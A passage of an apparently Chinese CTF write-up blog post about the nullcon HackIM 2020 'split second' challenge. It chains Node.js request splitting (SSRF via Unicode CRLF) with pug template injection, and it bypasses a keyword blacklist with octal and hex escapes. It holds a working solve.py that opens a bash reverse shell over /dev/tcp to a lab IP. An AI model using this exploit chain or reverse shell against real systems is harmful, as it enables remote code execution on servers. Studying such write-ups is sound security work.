&#123;(console.log(locals))&#125;'</span>+<span class="string">'\n'</span> +</span><br><span class="line">    <span class="string">'return '</span> + <span class="string">'template'</span> + <span class="string">';'</span>);</span><br><span class="line">t()(<span class="string">"1"</span>);</span><br></pre></td></tr></table></figure>
+
+<h6 id="request-splitting漏洞代码示例："><a href="#request-splitting漏洞代码示例：" class="headerlink" title="request splitting漏洞代码示例："></a>request splitting漏洞代码示例：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> server = http.createServer(<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(req.url);</span><br><span class="line">  res.end();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">server.listen(<span class="number">8000</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  http.get(<span class="string">'http://192.168.220.157:8000/?param=x\u&#123;0120&#125;HTTP/1.1\u&#123;010D&#125;\u&#123;010A&#125;Host:&#123;\u0120&#125;127.0.0.1:8000\u&#123;010D&#125;\u&#123;010A&#125;\u&#123;010D&#125;\u&#123;010A&#125;GET\u&#123;0120&#125;/private'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<h6 id="结果如下：-1"><a href="#结果如下：-1" class="headerlink" title="结果如下："></a>结果如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">listening on [any] 8000 ...</span><br><span class="line">192.168.220.1: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.220.157] from (UNKNOWN) [192.168.220.1] 65115</span><br><span class="line">GET /?param=x HTTP/1.1</span><br><span class="line">Host:%7B %7D127.0.0.1:8000</span><br><span class="line"></span><br><span class="line">GET /private HTTP/1.1</span><br><span class="line">Host: 192.168.220.157:8000</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+
+<h6 id="由上面的结果可知我们已经成功实现了CRLF注入-上面的显示-为-7B-7D可能是我kali的问题-。"><a href="#由上面的结果可知我们已经成功实现了CRLF注入-上面的显示-为-7B-7D可能是我kali的问题-。" class="headerlink" title="由上面的结果可知我们已经成功实现了CRLF注入(上面的显示:为%7B %7D可能是我kali的问题)。"></a>由上面的结果可知我们已经成功实现了<code>CRLF</code>注入(上面的显示<code>:</code>为<code>%7B %7D</code>可能是我kali的问题)。</h6><h6 id="接下来我们需要看那里调用了http-get导致SSRF。"><a href="#接下来我们需要看那里调用了http-get导致SSRF。" class="headerlink" title="接下来我们需要看那里调用了http.get导致SSRF。"></a>接下来我们需要看那里调用了<code>http.get</code>导致SSRF。</h6><h5 id="5-core"><a href="#5-core" class="headerlink" title="5./core"></a>5.<code>/core</code></h5><h6 id="这里的q是我们可控的，而且这里使用了http-get来发起请求刚好满足我们上面的条件，但是构造的url中不能有-quot-global-quot-quot-process-quot-quot-mainModule-quot-quot-require-quot-quot-root-quot-quot-child-process-quot-quot-exec-quot-quot-quot-quot-quot-39-quot-quot-quot-字符串，我们可以对代码进行jsfuck加密绕过，但是由于加密后的代码太大，请求量会很大，因此一般用js的匿名函数来绕过，且字母我们可以用8进制，16进制来代替，例如："><a href="#这里的q是我们可控的，而且这里使用了http-get来发起请求刚好满足我们上面的条件，但是构造的url中不能有-quot-global-quot-quot-process-quot-quot-mainModule-quot-quot-require-quot-quot-root-quot-quot-child-process-quot-quot-exec-quot-quot-quot-quot-quot-39-quot-quot-quot-字符串，我们可以对代码进行jsfuck加密绕过，但是由于加密后的代码太大，请求量会很大，因此一般用js的匿名函数来绕过，且字母我们可以用8进制，16进制来代替，例如：" class="headerlink" title="这里的q是我们可控的，而且这里使用了http.get来发起请求刚好满足我们上面的条件，但是构造的url中不能有[&quot;global&quot;, &quot;process&quot;,&quot;mainModule&quot;,&quot;require&quot;,&quot;root&quot;,&quot;child_process&quot;,&quot;exec&quot;,&quot;\&quot;&quot;,&quot;&#39;&quot;,&quot;!&quot;]字符串，我们可以对代码进行jsfuck加密绕过，但是由于加密后的代码太大，请求量会很大，因此一般用js的匿名函数来绕过，且字母我们可以用8进制，16进制来代替，例如："></a>这里的<code>q</code>是我们可控的，而且这里使用了<code>http.get</code>来发起请求刚好满足我们上面的条件，但是构造的<code>url</code>中不能有<code>[&quot;global&quot;, &quot;process&quot;,&quot;mainModule&quot;,&quot;require&quot;,&quot;root&quot;,&quot;child_process&quot;,&quot;exec&quot;,&quot;\&quot;&quot;,&quot;&#39;&quot;,&quot;!&quot;]</code>字符串，我们可以对代码进行<a href="http://www.jsfuck.com/" target="_blank" rel="noopener">jsfuck</a>加密绕过，但是由于加密后的代码太大，请求量会很大，因此一般用<code>js</code>的匿名函数来绕过，且字母我们可以用8进制，16进制来代替，例如：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[][<span class="string">'map'</span>][<span class="string">'constructor'</span>](<span class="string">'alert(1)'</span>)();</span><br><span class="line">[][<span class="string">'\155\141\160'</span>][<span class="string">'\143\157\156\163\164\162\165\143\164\157\162'</span>](<span class="string">'\141\154\145\162\164(1)'</span>)();</span><br><span class="line">[][<span class="string">'\x6d\x61\x70'</span>][<span class="string">'\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72'</span>](<span class="string">'\x61\x6c\x65\x72\x74(1)'</span>)();</span><br></pre></td></tr></table></figure>
+
+<h6 id="构造的脚本如下："><a href="#构造的脚本如下：" class="headerlink" title="构造的脚本如下："></a>构造的脚本如下：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stringToHex</span>(<span class="params">str,mode=<span class="number">8</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> splitChar=[<span class="string">"\""</span>,<span class="string">"\'"</span>,<span class="string">"`"</span>,<span class="string">"["</span>,<span class="string">"]"</span>,<span class="string">";"</span>,<span class="string">"("</span>,<span class="string">")"</span>,<span class="string">"."</span>,<span class="string">"1"</span>,<span class="string">"2"</span>,<span class="string">"3"</span>,<span class="string">"4"</span>,<span class="string">"5"</span>,<span class="string">"6"</span>,<span class="string">"7"</span>,<span class="string">"8"</span>,<span class="string">"9"</span>];</span><br><span class="line">    <span class="keyword">let</span> result = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; str.length; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(result === <span class="string">""</span>)&#123;</span><br><span class="line">            <span class="keyword">const</span> char=str[i];</span><br><span class="line">            <span class="keyword">if</span>(splitChar.includes(char))&#123;</span><br><span class="line">                result=char</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                result=str.charCodeAt(i).toString(mode)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">const</span> char=str[i];</span><br><span class="line">            <span class="keyword">if</span>(splitChar.includes(char))&#123;</span><br><span class="line">                result+=char</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">const</span> tmp=str.charCodeAt(i).toString(mode);</span><br><span class="line">                mode===<span class="number">8</span>?</span><br><span class="line">                    result += <span class="string">"\\"</span> + tmp:</span><br><span class="line">                    result += <span class="string">"\\x"</span> + tmp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(stringToHex(<span class="string">"[]['map']['constructor']('alert(1)')();"</span>,<span class="number">16</span>));</span><br></pre></td></tr></table></figure>
+
+<h6 id="上面的原理相当于构造了个new-Function-quot-alert-1-quot-，由于Object的constructor是指向Function的，示例如下："><a href="#上面的原理相当于构造了个new-Function-quot-alert-1-quot-，由于Object的constructor是指向Function的，示例如下：" class="headerlink" title="上面的原理相当于构造了个new Function(&quot;alert(1)&quot;)();，由于Object的constructor是指向Function的，示例如下："></a>上面的原理相当于构造了个<code>new Function(&quot;alert(1)&quot;)();</code>，由于<code>Object</code>的<code>constructor</code>是指向<code>Function</code>的，示例如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//我们可以使用以下方式创建一个函数:</span><br><span class="line">new Function(&quot;alert(1)&quot;);</span><br><span class="line">//也可以不要new</span><br><span class="line">Function(&quot;alert(1)&quot;)()</span><br><span class="line">//可以将Function转换下</span><br><span class="line">&quot;...&quot;.substr.constructor(&quot;alert(1)&quot;)()</span><br><span class="line">//再转换下</span><br><span class="line">&quot;...&quot;[&quot;substr&quot;][&quot;constructor&quot;](&quot;alert(1)&quot;)()</span><br><span class="line">//字符串全部转义</span><br><span class="line">&quot;...&quot;[&quot;\163\165\142\163\164\162&quot;][&quot;\143\157\156\163\164\162\165\143\164\157\162&quot;](&quot;\141\154\145\162\164\50\61\51&quot;)();</span><br></pre></td></tr></table></figure>
+
+<h6 id="代码我们也梳理了一遍，现在我们来看看怎么rce拿到flag。"><a href="#代码我们也梳理了一遍，现在我们来看看怎么rce拿到flag。" class="headerlink" title="代码我们也梳理了一遍，现在我们来看看怎么rce拿到flag。"></a>代码我们也梳理了一遍，现在我们来看看怎么rce拿到flag。</h6><h4 id="0x03-利用过程："><a href="#0x03-利用过程：" class="headerlink" title="0x03 利用过程："></a>0x03 利用过程：</h4><h6 id="solve-py"><a href="#solve-py" class="headerlink" title="solve.py"></a>solve.py</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=UTF-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.utils <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strTohex</span><span class="params">(str)</span>:</span></span><br><span class="line">	result=<span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> str:</span><br><span class="line">		<span class="keyword">if</span> i&gt;=<span class="string">'a'</span><span class="keyword">and</span> i&lt;=<span class="string">'z'</span>:</span><br><span class="line">			result+=<span class="string">'\\'</span>+oct(ord(i))[<span class="number">1</span>:]</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			result+=i</span><br><span class="line">	<span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/</span></span><br><span class="line"></span><br><span class="line">SPACE=<span class="string">u'\u0120'</span>.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">CRLF=<span class="string">u'\u010d\u010a'</span>.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">SLASH=<span class="string">u'\u012f'</span>.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">cmd = <span class="string">'bash -i &gt;&amp; /dev/tcp/192.168.220.157/8888 0&gt;&amp;1'</span></span><br><span class="line">payload = <span class="string">"process.binding('spawn_sync').spawn(&#123;file:'bash',args:['/bin/bash','-c','%s'],envPairs:['y='],stdio:[&#123;type:'pipe',readable:1&#125;]&#125;)"</span> % (cmd)</span><br><span class="line"></span><br><span class="line">pug = strTohex(<span class="string">'''-[]["constructor"]["constructor"]("&#123;&#125;")()'''</span>.format(payload)).replace(<span class="string">'"'</span>,<span class="string">'%22'</span>).replace(<span class="string">"'"</span>,<span class="string">"%27"</span>)</span><br><span class="line"><span class="comment"># pug = strTohex('''#&#123;[]["constructor"]["constructor"]("%s")()&#125;'''%(payload)).replace('"','%22').replace("'","%27")</span></span><br><span class="line"><span class="keyword">print</span> quote(pug)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'sol'</span>+SPACE+<span class="string">'HTTP'</span>+SLASH+<span class="string">'1.1'</span>+CRLF*<span class="number">2</span>+<span class="string">'GET'</span>+SPACE+SLASH+<span class="string">'flag'</span>+SPACE+<span class="string">'HTTP'</span>+SLASH+<span class="string">'1.1'</span>+CRLF+<span class="string">'x-forwarded-for:'</span>+SPACE+<span class="string">'127.0.0.1'</span>+CRLF+<span class="string">'adminauth:'</span>+SPACE+<span class="string">'secretpassword'</span>+CRLF+<span class="string">'pug:'</span>+SPACE+pug+CRLF+<span class="string">'test:'</span>+SPACE</span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line">res=requests.get(<span class="string">'http://192.168.220.154:8081/core?q='</span>+quote(payload))</span><br><span class="line"><span class="comment">#res=requests.get('http://web2.ctf.nullcon.net:8081/core?q='+requote_uri(payload))</span></span><br><span class="line"><span class="keyword">print</span> res.content</span><br></pre></td></tr></table></figure>
+
+<h6 id="结果如下：-2"><a href="#结果如下：-2" class="headerlink" title="结果如下："></a>结果如下：</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2020-2-15-nulllcon-hackim-split-second-3.PNG" alt></p>
+<h4 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h4><h6 id="通过这次的学习，感觉自己还有好多的不足，因此自己还有好多需要去了解的，去学习的。"><a href="#通过这次的学习，感觉自己还有好多的不足，因此自己还有好多需要去了解的，去学习的。" class="headerlink" title="通过这次的学习，感觉自己还有好多的不足，因此自己还有好多需要去了解的，去学习的。"></a>通过这次的学习，感觉自己还有好多的不足，因此自己还有好多需要去了解的，去学习的。</h6><h5 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h5><h6 id="https-github-com-xiaobye-ctf-CTF-writeups-blob-master-hackim-2020-web-split-20second-split-20second-md"><a href="#https-github-com-xiaobye-ctf-CTF-writeups-blob-master-hackim-2020-web-split-20second-split-20second-md" class="headerlink" title="https://github.com/xiaobye-ctf/CTF-writeups/blob/master/hackim-2020/web/split%20second/split%20second.md"></a><a href="https://github.com/xiaobye-ctf/CTF-writeups/blob/master/hackim-2020/web/split%20second/split%20second.md" target="_blank" rel="noopener">https://github.com/xiaobye-ctf/CTF-writeups/blob/master/hackim-2020/web/split%20second/split%20second.md</a></h6><h6 id="https-wooyun-js-org-drops-E4-B8-80-E4-B8-AA-E5-8F-AF-E5-A4-A7-E8-A7-84-E6-A8-A1-E6-82-84-E6-97-A0-E5-A3-B0-E6-81-AF-E7-AA-83-E5-8F-96-E6-B7-98-E5-AE-9D-E6-94-AF-E4-BB-98-E5-AE-9D-E8-B4-A6-E5-8F-B7-E4-B8-8E-E5-AF-86-E7-A0-81-E7-9A-84-E6-BC-8F-E6-B4-9E-20-EF-BC-88-E5-9F-8B-E9-9B-B7-E5-BC-8F-E6-94-BB-E5-87-BB-E9-99-84-E5-B8-A6-E8-A7-86-E9-A2-91-E6-BC-94-E7-A4-BA-EF-BC-89-html"><a href="#https-wooyun-js-org-drops-E4-B8-80-E4-B8-AA-E5-8F-AF-E5-A4-A7-E8-A7-84-E6-A8-A1-E6-82-84-E6-97-A0-E5-A3-B0-E6-81-AF-E7-AA-83-E5-8F-96-E6-B7-98-E5-AE-9D-E6-94-AF-E4-BB-98-E5-AE-9D-E8-B4-A6-E5-8F-B7-E4-B8-8E-E5-AF-86-E7-A0-81-E7-9A-84-E6-BC-8F-E6-B4-9E-20-EF-BC-88-E5-9F-8B-E9-9B-B7-E5-BC-8F-E6-94-BB-E5-87-BB-E9-99-84-E5-B8-A6-E8-A7-86-E9-A2-91-E6-BC-94-E7-A4-BA-EF-BC-89-html" class="headerlink" title="https://wooyun.js.org/drops/%E4%B8%80%E4%B8%AA%E5%8F%AF%E5%A4%A7%E8%A7%84%E6%A8%A1%E6%82%84%E6%97%A0%E5%A3%B0%E6%81%AF%E7%AA%83%E5%8F%96%E6%B7%98%E5%AE%9D.%E6%94%AF%E4%BB%98%E5%AE%9D%E8%B4%A6%E5%8F%B7%E4%B8%8E%E5%AF%86%E7%A0%81%E7%9A%84%E6%BC%8F%E6%B4%9E%20-%EF%BC%88%E5%9F%8B%E9%9B%B7%E5%BC%8F%E6%94%BB%E5%87%BB%E9%99%84%E5%B8%A6%E8%A7%86%E9%A2%91%E6%BC%94%E7%A4%BA%EF%BC%89.html"></a><a href="https://wooyun.js.org/drops/%E4%B8%80%E4%B8%AA%E5%8F%AF%E5%A4%A7%E8%A7%84%E6%A8%A1%E6%82%84%E6%97%A0%E5%A3%B0%E6%81%AF%E7%AA%83%E5%8F%96%E6%B7%98%E5%AE%9D.%E6%94%AF%E4%BB%98%E5%AE%9D%E8%B4%A6%E5%8F%B7%E4%B8%8E%E5%AF%86%E7%A0%81%E7%9A%84%E6%BC%8F%E6%B4%9E%20-%EF%BC%88%E5%9F%8B%E9%9B%B7%E5%BC%8F%E6%94%BB%E5%87%BB%E9%99%84%E5%B8%A6%E8%A7%86%E9%A2%91%E6%BC%94%E7%A4%BA%EF%BC%89.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/%E4%B8%80%E4%B8%AA%E5%8F%AF%E5%A4%A7%E8%A7%84%E6%A8%A1%E6%82%84%E6%97%A0%E5%A3%B0%E6%81%AF%E7%AA%83%E5%8F%96%E6%B7%98%E5%AE%9D.%E6%94%AF%E4%BB%98%E5%AE%9D%E8%B4%A6%E5%8F%B7%E4%B8%8E%E5%AF%86%E7%A0%81%E7%9A%84%E6%BC%8F%E6%B4%9E%20-%EF%BC%88%E5%9F%8B%E9%9B%B7%E5%BC%8F%E6%94%BB%E5%87%BB%E9%99%84%E5%B8%A6%E8%A7%86%E9%A2%91%E6%BC%94%E7%A4%BA%EF%BC%89.html</a></h6><h6 id="https-mengsec-com-2019-06-14-alert1-to-win"><a href="#https-mengsec-com-2019-06-14-alert1-to-win" class="headerlink" title="https://mengsec.com/2019/06/14/alert1-to-win/"></a><a href="https://mengsec.com/2019/06/14/alert1-to-win/" target="_blank" rel="noopener">https://mengsec.com/2019/06/14/alert1-to-win/</a></h6><h6 id="https-www-rfk-id-au-blog-entry-security-bugs-ssrf-via-request-splitting"><a href="#https-www-rfk-id-au-blog-entry-security-bugs-ssrf-via-request-splitting" class="headerlink" title="https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/"></a><a href="https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/" target="_blank" rel="noopener">https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/</a></h6><h6 id="https-zhuanlan-zhihu-com-p-28823933"><a href="#https-zhuanlan-zhihu-com-p-28823933" class="headerlink" title="https://zhuanlan.zhihu.com/p/28823933"></a><a href="https://zhuanlan.zhihu.com/p/28823933" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/28823933</a></h6><h6 id="https-tipi-hack-github-io-2019-04-14-breizh-jail-calc2-html"><a href="#https-tipi-hack-github-io-2019-04-14-breizh-jail-calc2-html" class="headerlink" title="https://tipi-hack.github.io/2019/04/14/breizh-jail-calc2.html"></a><a href="https://tipi-hack.github.io/2019/04/14/breizh-jail-calc2.html" target="_blank" rel="noopener">https://tipi-hack.github.io/2019/04/14/breizh-jail-calc2.html</a></h6>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/03/14/Node-js常见漏洞学习与总结/" rel="next" title="Node.js常见漏洞学习与总结">
+                <i class="fa fa-chevron-left"></i> Node.js常见漏洞学习与总结
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Ljdd520">
+            
+              <p class="site-author-name" itemprop="name">Ljdd520</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">47</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/yourname" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:yourname@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.wonderkun.cc/" title="wonderkun" target="_blank">wonderkun</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://example.com/" title="Title" target="_blank">Title</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-首页"><span class="nav-number">1.1.</span> <span class="nav-text">0x01 首页</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#当我们访问http-web2-ctf-nullcon-net-8081-后会显示下面的页面。"><span class="nav-number">1.1.0.1.</span> <span class="nav-text">当我们访问http://web2.ctf.nullcon.net:8081/后会显示下面的页面。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#由于上面没有什么特点，url参数，交互框等，因此我们查看源代码看看有没有什么提示。"><span class="nav-number">1.1.0.2.</span> <span class="nav-text">由于上面没有什么特点，url参数，交互框等，因此我们查看源代码看看有没有什么提示。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#通过源码-F12查看的-我们可以看到它在页面加载js代码完成后发送了个ajax请求："><span class="nav-number">1.1.0.3.</span> <span class="nav-text">通过源码(F12查看的)我们可以看到它在页面加载js代码完成后发送了个ajax请求：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我使用get请求发送-core-q-1，但是结果跟上面的首页是一样的只有一个动图，这时你可能会想会不会是sql注入，服务器端注入等，但是经过一系列的反恐尝试之没有什么用。"><span class="nav-number">1.1.0.4.</span> <span class="nav-text">我使用get请求发送/core?q=1，但是结果跟上面的首页是一样的只有一个动图，这时你可能会想会不会是sql注入，服务器端注入等，但是经过一系列的反恐尝试之没有什么用。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#但是在我们查看源代码的时候还给了个提示-lt-source-gt-通过访问-source可以获取题目源码。"><span class="nav-number">1.1.0.5.</span> <span class="nav-text">但是在我们查看源代码的时候还给了个提示&lt;!-- /source --&gt;通过访问/source可以获取题目源码。</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-代码分析"><span class="nav-number">1.2.</span> <span class="nav-text">0x02 代码分析</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#通过阅读上面的代码，我们可以看到node的版本是8-12-0，服务器端使用的框架是express，使用nodejs自带的http包发送某些请求，服务端使用pug作为渲染模板-原理加jade-。"><span class="nav-number">1.2.0.1.</span> <span class="nav-text">通过阅读上面的代码，我们可以看到node的版本是8.12.0，服务器端使用的框架是express，使用nodejs自带的http包发送某些请求，服务端使用pug作为渲染模板(原理加jade)。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#在没有发现漏洞之前，先梳理一下代码的流程："><span class="nav-number">1.2.1.</span> <span class="nav-text">在没有发现漏洞之前，先梳理一下代码的流程：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#1"><span class="nav-number">1.2.2.</span> <span class="nav-text">1./:</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#使用sendFile来读取index-html页面并且渲染该页面，通过前面我们知道该页面有提示的内容。"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">使用sendFile来读取index.html页面并且渲染该页面，通过前面我们知道该页面有提示的内容。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-source"><span class="nav-number">1.2.3.</span> <span class="nav-text">2./source:</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#该页面返回了服务器端的全部代码。"><span class="nav-number">1.2.3.1.</span> <span class="nav-text">该页面返回了服务器端的全部代码。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-getMeme"><span class="nav-number">1.2.4.</span> <span class="nav-text">3./getMeme:</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#该页面没有什么用就是返回了一个iframe框架，其中是个动图。"><span class="nav-number">1.2.4.1.</span> <span class="nav-text">该页面没有什么用就是返回了一个iframe框架，其中是个动图。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-flag"><span class="nav-number">1.2.5.</span> <span class="nav-text">4./flag:</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#这里验证远程地址包含127-0-0-1，adminauth-secretpassword，headers头中必须包含pug字段并且其值不能包含小写字母，最后会用pug引擎渲染pug，但是这里在渲染容易受到服务器端注入攻击https-zhuanlan-zhihu-com-p-28823933，由此我们可以断定前面需要用SSRF结合CRLF来绕过，不由联想到node的版本号，因为该版本存在request-splitting漏洞。"><span class="nav-number">1.2.5.1.</span> <span class="nav-text">这里验证远程地址包含127.0.0.1，adminauth===secretpassword，headers头中必须包含pug字段并且其值不能包含小写字母，最后会用pug引擎渲染pug，但是这里在渲染容易受到服务器端注入攻击https://zhuanlan.zhihu.com/p/28823933，由此我们可以断定前面需要用SSRF结合CRLF来绕过，不由联想到node的版本号，因为该版本存在request splitting漏洞。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#pug模板注入示例："><span 